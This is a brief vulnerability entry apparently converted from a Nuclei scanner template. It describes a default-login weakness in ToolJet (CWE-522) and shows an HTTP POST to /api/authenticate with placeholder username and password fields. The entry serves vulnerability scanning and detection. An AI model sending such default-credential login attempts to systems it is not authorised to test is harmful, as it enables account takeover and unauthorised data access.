# Vulnerability: ToolJet - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`tooljet-default-login.yaml`)

## Description
ToolJet contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/authenticate HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"email":"{{username}}","password":"{{password}}"}
```

